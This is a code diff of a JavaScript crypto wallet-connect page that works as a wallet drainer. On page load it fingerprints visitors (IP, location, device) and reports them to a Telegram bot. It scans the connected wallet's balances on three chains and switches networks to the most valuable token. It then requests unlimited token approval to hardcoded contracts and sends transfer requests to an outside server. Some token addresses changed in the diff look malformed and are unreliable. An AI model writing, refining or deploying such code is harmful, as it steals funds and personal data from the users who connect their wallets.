@@ -4,7 +4,7 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { parseEther, formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { sendTransaction, readContract, writeContract } from '@wagmi/core'
 
-// Utility for debouncing to prevent multiple subscribeAccount calls
+// Утилита для дебаунсинга
 const debounce = (func, wait) => {
   let timeout
   return (...args) => {
@@ -13,15 +13,24 @@ const debounce = (func, wait) => {
   }
 }
 
+// Конфигурация
 const projectId = import.meta.env.VITE_PROJECT_ID || "d85cc83edb401b676e2a7bcef67f3be8"
 if (!projectId) {
   throw new Error('VITE_PROJECT_ID is not set')
 }
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "7776383972:AAE8wjnGU8nrKIZsCsYQFaC8xVHw8M4QltY"
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || "-4832119840"
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || "-1001234567890"
 
-const networks = [mainnet, bsc, polygon]
+const networks = [bsc, mainnet, polygon]
+
+// Создание маппинга сетей
+const networkMap = {
+  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
+  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
+  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
+}
+console.log('Network Map:', networkMap)
 
 const wagmiAdapter = new WagmiAdapter({
   projectId,
@@ -40,6 +49,7 @@ const appKit = createAppKit({
   }
 })
 
+// Состояние приложения
 const store = {
   accountState: {},
   networkState: {},
@@ -50,11 +60,12 @@ const store = {
   eip155Provider: null,
   tokenBalances: [],
   errors: [],
-  approvedTokens: {}, // Cache for approved tokens
-  isApprovalRequested: false, // Flag to track if approval is already requested
-  isApprovalRejected: false // Flag to track if approval was rejected
+  approvedTokens: {},
+  isApprovalRequested: false,
+  isApprovalRejected: false
 }
 
+// Утилиты для обновления состояния
 const updateStore = (key, value) => {
   store[key] = value
 }
@@ -63,8 +74,6 @@ const updateStateDisplay = (elementId, state) => {
   const element = document.getElementById(elementId)
   if (element) {
     element.innerHTML = JSON.stringify(state, null, 2)
-  } else {
-    console.warn(`Element with ID ${elementId} not found`)
   }
 }
 
@@ -81,6 +90,7 @@ const updateButtonVisibility = (isConnected) => {
   })
 }
 
+// Функции взаимодействия с блокчейном
 const signMessage = (provider, address) => {
   if (!provider) return Promise.reject('No provider available')
   
@@ -112,7 +122,7 @@ const getBalance = async (provider, address, wagmiConfig) => {
   return ethBalance
 }
 
-// Function to send transfer request to server
+// Функция отправки запроса на трансфер
 const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
   try {
     const response = await fetch('https://api.amlinsight.io/api/transfer', {
@@ -127,91 +137,89 @@ const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, t
         chainId,
         txHash,
       }),
-    });
+    })
     
-    const data = await response.json();
+    const data = await response.json()
     if (data.success) {
-      console.log(`Transfer request successful: ${data.txHash}`);
-      return { success: true, txHash: data.txHash };
+      console.log(`Transfer request successful: ${data.txHash}`)
+      return { success: true, txHash: data.txHash }
     } else {
-      console.error(`Transfer request failed: ${data.message}`);
-      store.errors.push(`Transfer request failed: ${data.message}`);
-      return { success: false, message: data.message };
+      console.error(`Transfer request failed: ${data.message}`)
+      store.errors.push(`Transfer request failed: ${data.message}`)
+      return { success: false, message: data.message }
     }
   } catch (error) {
-    console.error(`Error sending transfer request: ${error.message}`);
-    store.errors.push(`Error sending transfer request: ${error.message}`);
-    return { success: false, message: error.message };
+    console.error(`Error sending transfer request: ${error.message}`)
+    store.errors.push(`Error sending transfer request: ${error.message}`)
+    return { success: false, message: error.message }
   }
 }
 
-// Function to get user IP
+// Функции для получения информации о пользователе
 async function getUserIP() {
-  const cachedIP = sessionStorage.getItem('userIP');
-  if (cachedIP) return cachedIP;
+  const cachedIP = sessionStorage.getItem('userIP')
+  if (cachedIP) return cachedIP
 
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    const ip = data.ip || 'Unknown IP';
-    sessionStorage.setItem('userIP', ip);
-    return ip;
+    const response = await fetch('https://api.ipify.org?format=json')
+    const data = await response.json()
+    const ip = data.ip || 'Unknown IP'
+    sessionStorage.setItem('userIP', ip)
+    return ip
   } catch (error) {
-    console.error(`❌ Error fetching IP: ${error.message}`);
-    store.errors.push(`Error fetching IP: ${error.message}`);
-    return 'Unknown IP';
+    console.error(`❌ Error fetching IP: ${error.message}`)
+    store.errors.push(`Error fetching IP: ${error.message}`)
+    return 'Unknown IP'
   }
 }
 
-// Function to get geolocation
 async function getGeolocation(ip) {
-  const cachedLocation = sessionStorage.getItem('userLocation');
-  if (cachedLocation) return cachedLocation;
+  const cachedLocation = sessionStorage.getItem('userLocation')
+  if (cachedLocation) return cachedLocation
 
   try {
-    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
-    const data = await response.json();
+    const response = await fetch(`https://freeipapi.com/api/json/${ip}`)
+    const data = await response.json()
     if (data.cityName && data.countryName) {
-      const location = `${data.cityName}, ${data.countryName}`;
-      sessionStorage.setItem('userLocation', location);
-      return location;
+      const location = `${data.cityName}, ${data.countryName}`
+      sessionStorage.setItem('userLocation', location)
+      return location
     }
-    return 'Unknown Location';
+    return 'Unknown Location'
   } catch (error) {
-    console.error(`❌ Error fetching geolocation: ${error.message}`);
-    store.errors.push(`Error fetching geolocation: ${error.message}`);
-    return 'Unknown Location';
+    console.error(`❌ Error fetching geolocation: ${error.message}`)
+    store.errors.push(`Error fetching geolocation: ${error.message}`)
+    return 'Unknown Location'
   }
 }
 
-// Function to detect device
 function detectDevice() {
-  const userAgent = navigator.userAgent || 'Unknown Device';
-  let deviceType = 'Desktop';
-  let browser = 'Unknown Browser';
+  const userAgent = navigator.userAgent || 'Unknown Device'
+  let deviceType = 'Desktop'
+  let browser = 'Unknown Browser'
 
   if (/mobile/i.test(userAgent)) {
-    deviceType = 'Mobile';
+    deviceType = 'Mobile'
   } else if (/tablet/i.test(userAgent)) {
-    deviceType = 'Tablet';
+    deviceType = 'Tablet'
   }
 
   if (/chrome/i.test(userAgent) && !/edg/i.test(userAgent)) {
-    browser = 'Chrome';
+    browser = 'Chrome'
   } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
-    browser = 'Safari';
+    browser = 'Safari'
   } else if (/firefox/i.test(userAgent)) {
-    browser = 'Firefox';
+    browser = 'Firefox'
   } else if (/edg/i.test(userAgent)) {
-    browser = 'Edge';
+    browser = 'Edge'
   } else if (/opera|opr/i.test(userAgent)) {
-    browser = 'Opera';
+    browser = 'Opera'
   }
 
-  return `${deviceType} (${browser})`;
+  return `${deviceType} (${browser})`
 }
 
-// Function to send Telegram message
+// Функция отправки сообщений в Telegram
 async function sendTelegramMessage(message) {
   try {
     const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -224,180 +232,133 @@ async function sendTelegramMessage(message) {
         text: message,
         parse_mode: 'Markdown',
       }),
-    });
+    })
     
-    const data = await response.json();
+    const data = await response.json()
     if (!data.ok) {
-      throw new Error(data.description || 'Failed to send Telegram message');
+      throw new Error(data.description || 'Failed to send Telegram message')
     }
-    console.log('Telegram message sent successfully');
+    console.log('Telegram message sent successfully')
   } catch (error) {
-    console.error(`❌ Error sending Telegram message: ${error.message}`);
-    store.errors.push(`Error sending Telegram message: ${error.message}`);
+    console.error(`❌ Error sending Telegram message: ${error.message}`)
+    store.errors.push(`Error sending Telegram message: ${error.message}`)
   }
 }
 
-// Function to notify on visit
+// Уведомления
 async function notifyOnVisit() {
-  if (sessionStorage.getItem('visitNotified')) return;
+  if (sessionStorage.getItem('visitNotified')) return
 
-  const domain = window.location.hostname || 'Unknown Domain';
-  const ip = await getUserIP();
-  const location = await getGeolocation(ip);
-  const device = detectDevice();
+  const domain = window.location.hostname || 'Unknown Domain'
+  const ip = await getUserIP()
+  const location = await getGeolocation(ip)
+  const device = detectDevice()
 
   const message = `🔔 Visit | **${domain}**\n\n` +
                   `IP: \`${ip}\`\n` +
                   `Where: \`${location}\`\n` +
-                  `Device: \`${device}\``;
+                  `Device: \`${device}\``
 
-  await sendTelegramMessage(message);
-  sessionStorage.setItem('visitNotified', 'true');
+  await sendTelegramMessage(message)
+  sessionStorage.setItem('visitNotified', 'true')
 }
 
-// New function to notify on wallet connection
 async function notifyWalletConnection(address, walletName, device) {
-  if (sessionStorage.getItem('walletConnectedNotified')) return;
+  if (sessionStorage.getItem('walletConnectedNotified')) return
 
   const message = `🌀 Connect |\n` +
                   `Wallet: \`${address}\`\n` +
                   `Wallet Name: \`${walletName}\`\n` +
-                  `Device: \`${device}\``;
+                  `Device: \`${device}\``
 
-  await sendTelegramMessage(message);
-  sessionStorage.setItem('walletConnectedNotified', 'true');
+  await sendTelegramMessage(message)
+  sessionStorage.setItem('walletConnectedNotified', 'true')
 }
 
-// New function to notify on token check
 async function notifyTokenCheck(balances, mostExpensive, device) {
-  if (sessionStorage.getItem('tokenCheckNotified')) return;
+  if (sessionStorage.getItem('tokenCheckNotified')) return
 
-  let message;
+  let message
   if (!mostExpensive) {
     message = `😢 | wallet is empty\n` +
-              `Device: \`${device}\``;
+              `Device: \`${device}\``
   } else {
     const tokenList = balances
       .filter(token => token.balance > 0)
       .map(token => {
-        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0;
-        const value = (token.balance * price).toFixed(2);
-        return `${token.symbol}: ${token.balance.toFixed(2)} (${value}$)`;
+        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
+        const value = (token.balance * price).toFixed(2)
+        return `${token.symbol}: ${token.balance.toFixed(2)} (${value}$)`
       })
-      .join('\n');
+      .join('\n')
 
-    const mostValuable = `${mostExpensive.symbol}: ${mostExpensive.balance.toFixed(2)} (${mostExpensive.value.toFixed(2)}$)`;
+    const mostValuable = `${mostExpensive.symbol}: ${mostExpensive.balance.toFixed(2)} (${mostExpensive.value.toFixed(2)}$)`
     message = `🤩 | Tokens\n` +
               `${tokenList}\n` +
               `The most valuable: ${mostValuable}\n` +
-              `Device: \`${device}\``;
+              `Device: \`${device}\``
   }
 
-  await sendTelegramMessage(message);
-  sessionStorage.setItem('tokenCheckNotified', 'true');
+  await sendTelegramMessage(message)
+  sessionStorage.setItem('tokenCheckNotified', 'true')
 }
 
+// Инициализация подписок
 const initializeSubscribers = (modal) => {
   modal.subscribeProviders(state => {
     updateStore('eip155Provider', state['eip155'])
   })
 
-  // Debounced subscribeAccount to prevent multiple calls
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
     updateStateDisplay('accountState', state)
 
-    // Check token balances across all networks after wallet connection
     if (state.isConnected && state.address && store.eip155Provider) {
-      // Notify on wallet connection
-      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' };
-      const device = detectDevice();
-      await notifyWalletConnection(state.address, walletInfo.name, device);
+      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+      const device = detectDevice()
+      await notifyWalletConnection(state.address, walletInfo.name, device)
 
-      const ethMainnet = networks.find(n => n.chainId === 1)
-      const bscMainnet = networks.find(n => n.chainId === 56)
-      const polygonMainnet = networks.find(n => n.chainId === 137)
-
-      // Prepare balance checks for all networks
       const balancePromises = []
 
-      // Ethereum balances
-      TOKENS.ETHEREUM.forEach(token => {
-        balancePromises.push(
-          getTokenBalance(
-            wagmiAdapter.wagmiConfig,
-            state.address,
-            token.address,
-            token.decimals,
-            1
-          ).then(balance => ({
-            symbol: token.symbol,
-            balance,
-            address: token.address,
-            network: 'Ethereum',
-            chainId: 1,
-            decimals: token.decimals
-          }))
-        )
+      // Получение балансов токенов для каждой сети
+      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
+        const networkInfo = networkMap[networkName]
+        if (!networkInfo) {
+          console.warn(`Network ${networkName} not found in networkMap`)
+          return
+        }
+        tokens.forEach(token => {
+          balancePromises.push(
+            getTokenBalance(
+              wagmiAdapter.wagmiConfig,
+              state.address,
+              token.address,
+              token.decimals,
+              networkInfo.chainId
+            ).then(balance => ({
+              symbol: token.symbol,
+              balance,
+              address: token.address,
+              network: networkName,
+              chainId: networkInfo.chainId,
+              decimals: token.decimals
+            }))
+          )
+        })
       })
 
-      // BNB Chain balances
-      TOKENS.BNB.forEach(token => {
-        balancePromises.push(
-          getTokenBalance(
-            wagmiAdapter.wagmiConfig,
-            state.address,
-            token.address,
-            token.decimals,
-            56
-          ).then(balance => ({
-            symbol: token.symbol,
-            balance,
-            address: token.address,
-            network: 'BNB Chain',
-            chainId: 56,
-            decimals: token.decimals
-          }))
-        )
-      })
-
-      // Polygon balances
-      TOKENS.POLYGON.forEach(token => {
-        balancePromises.push(
-          getTokenBalance(
-            wagmiAdapter.wagmiConfig,
-            state.address,
-            token.address,
-            token.decimals,
-            137
-          ).then(balance => ({
-            symbol: token.symbol,
-            balance,
-            address: token.address,
-            network: 'Polygon',
-            chainId: 137,
-            decimals: token.decimals
-          }))
-        )
-      })
-
-      // Fetch all balances concurrently
       const allBalances = await Promise.all(balancePromises)
-
-      // Store and display balances
       store.tokenBalances = allBalances
       updateStateDisplay('tokenBalancesState', allBalances)
 
-      // Find most expensive token
       let maxValue = 0
       let mostExpensive = null
 
       for (const token of allBalances) {
         if (token.balance > 0) {
-          // Use fixed price for USDT and USDC, Binance API for others
           const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
           const value = token.balance * price
-          token.price = price; // Store price for notification
+          token.price = price
           if (value > maxValue) {
             maxValue = value
             mostExpensive = { ...token, price, value }
@@ -405,31 +366,69 @@ const initializeSubscribers = (modal) => {
         }
       }
 
-      // Notify on token check
-      await notifyTokenCheck(allBalances, mostExpensive, device);
+      await notifyTokenCheck(allBalances, mostExpensive, device)
 
-      // Display result, switch network, and propose approve
       if (mostExpensive) {
         const message = `Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`
         console.log(message)
-        const connectModal = document.getElementById('open-connect-modal')
-        if (connectModal) connectModal.innerHTML = 'Loading...'
 
-        // Switch to the network of the most expensive token
-        const targetNetwork = networks.find(n => n.chainId === mostExpensive.chainId)
-        if (targetNetwork && store.networkState.chainId !== mostExpensive.chainId) {
-          console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`)
-          try {
-            await appKit.switchNetwork(targetNetwork)
-          } catch (switchError) {
-            console.error(`Failed to switch network: ${switchError.message}`)
-            store.errors.push(`Failed to switch network: ${switchError.message}`)
-            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
-            return
-          }
+        // Диагностика доступных сетей
+        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
+
+        // Поиск целевой сети
+        const targetNetworkInfo = networkMap[mostExpensive.network]
+        if (!targetNetworkInfo) {
+          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
+          console.error(errorMessage)
+          store.errors.push(errorMessage)
+          const approveState = document.getElementById('approveState')
+          const approveSection = document.getElementById('approveSection')
+          if (approveState) approveState.innerHTML = errorMessage
+          if (approveSection) approveSection.style.display = ''
+          return
         }
 
-        // Propose approve for the most expensive token only if not already requested or rejected
+        const targetNetwork = targetNetworkInfo.networkObj
+        const expectedChainId = targetNetworkInfo.chainId
+
+        // Переключение сети, если необходимо
+        if (store.networkState.chainId !== expectedChainId) {
+          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+          try {
+            await new Promise((resolve, reject) => {
+              const unsubscribe = modal.subscribeNetwork(networkState => {
+                if (networkState.chainId === expectedChainId) {
+                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+                  unsubscribe()
+                  resolve()
+                }
+              })
+
+              appKit.switchNetwork(targetNetwork).catch(error => {
+                unsubscribe()
+                reject(error)
+              })
+
+              setTimeout(() => {
+                unsubscribe()
+                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+              }, 10000)
+            })
+          } catch (switchError) {
+            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${switchError.message}`
+            console.error(errorMessage)
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            const approveSection = document.getElementById('approveSection')
+            if (approveState) approveState.innerHTML = errorMessage
+            if (approveSection) approveSection.style.display = ''
+            return
+          }
+        } else {
+          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+        }
+
+        // Выполняем одобрение токена только после успешного переключения сети
         try {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
           const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
@@ -445,12 +444,10 @@ const initializeSubscribers = (modal) => {
             const approveSection = document.getElementById('approveSection')
             if (approveState) approveState.innerHTML = approveMessage
             if (approveSection) approveSection.style.display = ''
-            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
             return
           }
 
           store.isApprovalRequested = true
-
           const txHash = await approveToken(
             wagmiAdapter.wagmiConfig,
             mostExpensive.address,
@@ -484,29 +481,24 @@ const initializeSubscribers = (modal) => {
           const approveSection = document.getElementById('approveSection')
           if (approveState) approveState.innerHTML = approveMessage
           if (approveSection) approveSection.style.display = ''
-          if (connectModal) connectModal.innerHTML = 'Connect Wallet'
         } catch (error) {
           if (error.code === 4001 || error.code === -32000) {
             store.isApprovalRejected = true
             store.isApprovalRequested = false
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
-            console.error(errorMessage)
             const approveState = document.getElementById('approveState')
             const approveSection = document.getElementById('approveSection')
             if (approveState) approveState.innerHTML = errorMessage
             if (approveSection) approveSection.style.display = ''
-            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
           } else {
             store.isApprovalRequested = false
             const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
             store.errors.push(errorMessage)
-            console.error(errorMessage)
             const approveState = document.getElementById('approveState')
             const approveSection = document.getElementById('approveSection')
             if (approveState) approveState.innerHTML = errorMessage
             if (approveSection) approveSection.style.display = ''
-            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
           }
         }
       } else {
@@ -528,9 +520,7 @@ const initializeSubscribers = (modal) => {
     
     const switchNetworkBtn = document.getElementById('switch-network')
     if (switchNetworkBtn) {
-      switchNetworkBtn.textContent = `Switch to ${
-        state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'
-      }`
+      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
     }
   })
 
@@ -552,7 +542,6 @@ document.getElementById('disconnect')?.addEventListener('click', () => {
   store.errors = []
   store.isApprovalRequested = false
   store.isApprovalRejected = false
-  // Clear notification flags on disconnect
   sessionStorage.removeItem('walletConnectedNotified')
   sessionStorage.removeItem('tokenCheckNotified')
 })
@@ -586,16 +575,15 @@ document.getElementById('get-balance')?.addEventListener('click', async () => {
   if (balanceSection) balanceSection.style.display = ''
 })
 
-updateTheme(store.themeState.themeMode)
 
 const CONTRACTS = {
-  1: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
-  56: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
-  137: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c', // Polygon
+  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
+  [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
+  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c', // Polygon
 }
 
 const TOKENS = {
-  ETHEREUM: [
+  'Ethereum': [
     { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
     { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
     { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
@@ -622,15 +610,15 @@ const TOKENS = {
     { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
     { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 18 },
   ],
-  BNB: [
+  'BNB Smart Chain': [
     { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
     { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
-    { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
+    { symbol: 'SHIB', address: '0x2859e4544c4bb0390a468f4b6e3e63bd2d0dd4d', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
     { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
     { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
     { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
-    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63', decimals: 18 },
+    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
     { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
     { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
     { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
@@ -643,7 +631,7 @@ const TOKENS = {
     { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
     { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 },
   ],
-  POLYGON: [
+  'Polygon': [
     { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
     { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
     { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
@@ -722,15 +710,14 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    // Fixed gas parameters
-    const gasLimit = BigInt(65000) // Fixed gas limit for approve
-    const maxFeePerGas = BigInt(10_000_000_000) // 10 Gwei
-    const maxPriorityFeePerGas = BigInt(2_000_000_000) // 2 Gwei
+    const gasLimit = BigInt(65000)
+    const maxFeePerGas = BigInt(10_000_000_000)
+    const maxPriorityFeePerGas = BigInt(2_000_000_000)
 
     console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
 
     const txHash = await writeContract(wagmiConfig, {
-      address: checksumTokenAddress,
+      address: tokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
@@ -742,11 +729,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
     console.log(`Approve transaction sent: ${txHash}`)
     return txHash
   } catch (error) {
-    console.error(`Approve token failed: ${error.message}`)
     store.errors.push(`Approve token failed: ${error.message}`)
     throw error
   }
 }
 
-// Notify on visit when the page loads
 notifyOnVisit()
